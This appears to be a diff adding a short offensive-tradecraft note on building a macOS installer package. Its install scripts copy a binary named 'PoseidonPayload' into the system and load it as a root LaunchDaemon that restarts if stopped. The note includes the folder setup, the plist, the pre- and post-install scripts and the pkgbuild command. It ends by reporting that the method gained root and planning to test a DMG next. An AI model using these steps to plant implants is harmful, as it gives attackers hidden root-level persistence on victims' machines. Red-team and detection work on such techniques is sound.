@@ -1,0 +1,63 @@
+### PKG
+Installer PKG, persistence at root
+
+Create installer structure:
+
+```
+mkdir scripts  
+mkdir scripts/files  
+touch scripts/preinstall  
+touch scripts/postinstall  
+chmod +x scripts/preinstall  
+chmod +x scripts/postinstall
+```
+
+ make your pre and postinstall scripts executable before packaging 
+
+Create Plist to register as launch daemon
+
+```
+<?xml version="1.0" encoding="UTF-8"?>  
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">  
+<plist version="1.0">  
+<dict>  
+<key>Label</key>  
+<string>com.examplepayload.persistence</string>  
+<key>ProgramArguments</key>  
+<array>  
+<string>/Library/Application Support/PoseidonPayload</string>  
+</array>  
+<key>KeepAlive</key>  
+<true/>  
+</dict>  
+</plist>
+```
+
+Move plist and universal binary into correct locations
+`scripts/files/com.examplepayload.persistence.plist` 
+`scripts/files/PoseidonPayload`
+
+
+Pre and Post install scripts have rules
+They are likeregular bash scripts, however, they must start with `#!/bin/bash` and end with `exit 0` .
+Pre
+
+```
+#!/bin/bash  
+cp files/PoseidonPayload "/Library/Application Support/PoseidonPayload"  
+cp files/com.examplepayload.persistence.plist "/Library/LaunchDaemons/com.examplepayload.persistence.plist"  
+exit 0
+```
+Post
+```
+#!/bin/bash  
+launchctl load "/Library/LaunchDaemons/com.examplepayload.persistence.plist"  
+exit 0
+```
+pkg build
+```
+pkgbuild --identifier <identifier> --nopayload --scripts <path to scripts folder> <output>.pkg
+```
+
+Ended up working, gets root but also requires allowing on latest macos
+Do DMG to see if it also is locked down!
